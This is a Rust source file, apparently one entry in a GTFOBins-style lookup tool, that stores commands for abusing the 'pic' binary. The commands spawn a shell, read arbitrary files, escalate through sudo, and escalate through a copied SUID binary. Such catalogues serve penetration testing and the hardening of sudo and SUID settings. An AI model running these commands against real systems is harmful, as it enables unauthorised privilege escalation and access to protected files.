pub static BIN_NAME: &'static str = "pic";
pub static SH_CODE: &'static str = r#"
    
    pic -U
    .PS
    sh X sh X
"#;
pub static FR_DESC: &'static str = "The output is prefixed with come content as a header.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    pic $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo pic -U
    .PS
    sh X sh X
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which pic) .

    ./pic -U
    .PS
    sh X sh X
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
